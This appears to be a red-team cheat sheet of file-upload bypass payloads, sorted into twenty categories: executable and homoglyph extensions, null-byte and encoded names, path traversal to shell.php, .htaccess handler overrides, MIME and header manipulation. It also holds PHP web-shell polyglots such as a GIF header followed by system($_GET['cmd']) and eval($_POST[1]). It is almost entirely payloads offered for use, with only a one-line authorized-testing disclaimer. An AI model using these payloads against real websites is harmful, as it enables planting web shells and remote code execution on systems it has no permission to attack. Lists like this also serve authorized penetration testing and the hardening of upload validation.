# 🛡 Ultimate File Upload Bypass – Optimized Edition
_By CybrX1337 – Red Team Focus_

⚠ **Educational / Authorized Testing Only**

---

# 📑 Table of Contents

1. [Common Executable Extensions](#1️⃣-common-executable-extensions-15)
2. [Mixed Case / Unicode Homoglyphs](#2️⃣-mixed-case--unicode-homoglyphs-5)
3. [Null Byte & Control Character Injection](#3️⃣-null-byte--control-character-injection-5)
4. [Double Extensions](#4️⃣-double-extensions-5)
5. [Fragment, Comment & Semicolon Tricks](#5️⃣-fragment-comment--semicolon-tricks-5)
6. [Path Traversal + Upload](#6️⃣-path-traversal--upload-5)
7. [Encoded Extensions](#7️⃣-encoded-extensions-5)
8. [Apache / Nginx Double Parsing](#8️⃣-apache--nginx-double-parsing-5)
9. [Exotic Extensions Parsed as PHP](#9️⃣-exotic-extensions-parsed-as-php-5)
10. [Dangerous .htaccess Uploads](#🔟-dangerous-htaccess-uploads-5)
11. [Polyglot Payloads](#1️⃣1️⃣-polyglot-payloads-5)
12. [MIME-Type Abuse](#1️⃣2️⃣-mime-type-abuse-5)
13. [Archive Tricks](#1️⃣3️⃣-archive-tricks-5)
14. [Legacy Apache mod_mime Confusion](#1️⃣4️⃣-legacy-apache-mod_mime-confusion-5)
15. [IIS / NTFS Alternate Data Streams](#1️⃣5️⃣-iis--ntfs-alternate-data-streams-5)
16. [SVG + PHP Polyglots](#1️⃣6️⃣-svg--php-polyglots-5)
17. [Malformed Headers in Upload](#1️⃣7️⃣-malformed-headers-in-upload-5)
18. [HTTP Parameter Pollution in Upload](#1️⃣8️⃣-http-parameter-pollution-in-upload-5)
19. [Chunked Transfer Encoding Tricks](#1️⃣9️⃣-chunked-transfer-encoding-tricks-5)
20. [Rare Unicode Dot / Slash Bypasses](#2️⃣0️⃣-rare-unicode-dot--slash-bypasses-5)

---

## 1️⃣ Common Executable Extensions (15)
.php  
.phtml  
.php3  
.php4  
.php5  
.phps  
.phar  
.inc  
.asp  
.aspx  
.ashx  
.cfm  
.jsp  
.jsf  
.shtm  

---

## 2️⃣ Mixed Case / Unicode Homoglyphs (5)
.PHP  
.pHp  
.PHTML  
.pһp  # Cyrillic һ  
.phρ   # Greek rho  

---

## 3️⃣ Null Byte & Control Character Injection (5)
file.php%00  
file.php%00.png  
file.php%0a  
file.php%09  
file.php%20  

---

## 4️⃣ Double Extensions (5)
file.php.jpg  
file.jpg.php  
file.png.php  
file.gif.php  
file.php.jpg%00.png  

---

## 5️⃣ Fragment, Comment & Semicolon Tricks (5)
file.php#.jpg  
file.php%23.jpg  
file.php;jpg  
file.php;.jpg  
file.php::$DATA  

---

## 6️⃣ Path Traversal + Upload (5)
../../shell.php  
..%2f..%2fshell.php  
..%5c..%5cshell.php  
%2e%2e%2f%2e%2e%2fshell.php  
shell.php/..  

---

## 7️⃣ Encoded Extensions (5)
file%2Ephp  
file%252Ephp  
file.p%68p  
file.p\u0068p  
file.php%2Ejpg  

---

## 8️⃣ Apache / Nginx Double Parsing (5)
shell.php/.jpg  
shell.php%00.jpg  
shell.php%20.jpg  
shell.php;jpg  
shell.php..jpg  

---

## 9️⃣ Exotic Extensions Parsed as PHP (5)
.sphp  
.php-s  
.phar  
.suspected  
.module  

---

## 🔟 Dangerous .htaccess Uploads (5)
.htaccess  
AddType application/x-httpd-php .jpg  
AddHandler application/x-httpd-php .gif  
AddType application/x-httpd-php .png  
AddHandler application/x-httpd-php .txt  

---

## 1️⃣1️⃣ Polyglot Payloads (5)
GIF89a;<?php system($_GET['cmd']); ?>  
FFD8FF...<?php echo "JPEG+PHP"; ?>  
PNG....IEND<?php phpinfo(); ?>  
PDF%0A<?php eval($_POST[1]); ?>  
<?php echo 'EXIF Injection'; ?>  

---

## 1️⃣2️⃣ MIME-Type Abuse (5)
Content-Type: application/x-php  
Content-Type: text/plain  
Content-Type: image/jpeg  
Content-Type: image/png  
Content-Type: application/octet-stream  

---

## 1️⃣3️⃣ Archive Tricks (5)
shell.php.zip  
shell.php.tar  
shell.php.tar.gz  
shell.php.rar  
shell.php.gz  

---

## 1️⃣4️⃣ Legacy Apache mod_mime Confusion (5)
shell.php.en  
shell.php.fr  
shell.php.txt.en  
shell.php.plain.en  
shell.php.de  

---

## 1️⃣5️⃣ IIS / NTFS Alternate Data Streams (5)
shell.asp::$DATA  
shell.php::$DATA  
shell.php::$INDEX_ALLOCATION  
shell.aspx::$DATA  
shell.asp::$INDEX_ALLOCATION  

---

## 1️⃣6️⃣ SVG + PHP Polyglots (5)
image.svg containing `<?php ... ?>`  
SVG with embedded `<script>` executing PHP  
SVG with Base64-encoded PHP in `<image xlink:href>`  
SVG + JPEG polyglot with PHP footer  
SVG with external entity injection calling PHP  

---

## 1️⃣7️⃣ Malformed Headers in Upload (5)
Content-Disposition: form-data; name="file"; filename="shell.php  
Content-Disposition: form-data; filename="shell.php" name="file  
Missing Content-Type header  
Duplicate Content-Type header with different MIME  
MIME header split using CRLF injection  

---

## 1️⃣8️⃣ HTTP Parameter Pollution in Upload (5)
filename="shell.php" filename="shell.jpg"  
filename="shell.jpg" filename="shell.php"  
filename*="UTF-8''shell.php"  
filename="shell.php?abc=1"  
filename="shell.php%00.jpg"  

---

## 1️⃣9️⃣ Chunked Transfer Encoding Tricks (5)
PHP hidden in second chunk  
Chunked request with early terminating chunk  
MIME headers split between chunks  
PHP payload obfuscated with chunk boundaries  
Overlapping chunk sizes causing parser confusion  

---

## 2️⃣0️⃣ Rare Unicode Dot / Slash Bypasses (5)
file.php%E2%80%AE.jpg  
file.php%E2%80%AD.jpg  
file%u002Ephp  
file%u2215php  
file%u2024php  
